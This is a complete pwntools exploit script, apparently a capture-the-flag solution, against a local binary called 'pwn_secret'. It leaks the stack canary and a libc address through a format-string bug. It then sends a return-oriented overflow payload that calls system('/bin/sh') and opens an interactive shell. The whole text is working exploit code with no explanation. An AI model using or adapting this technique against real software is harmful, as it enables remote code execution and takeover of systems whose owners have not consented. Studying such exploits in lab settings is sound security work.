from pwn import *

elf = ELF("pwn_secret")
libc = elf.libc

p = process("./pwn_secret")

p.sendlineafter(b": ", b"%15$p %17$p")
leak = p.recvline().split()
libc.address = int(leak[2], 16) - 0x21b97
canary = int(leak[1], 16)

log.info("Canary: "+hex(canary))
log.info("libc: "+hex(libc.address))

pop_rdi = libc.address + 0x000000000002155f
ret = libc.address + 0x00000000000008aa

payload = b"A"*136
payload += p64(canary)
payload += b"B"*8
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(libc.symbols['system'])

p.sendlineafter(": ",payload)
p.interactive()
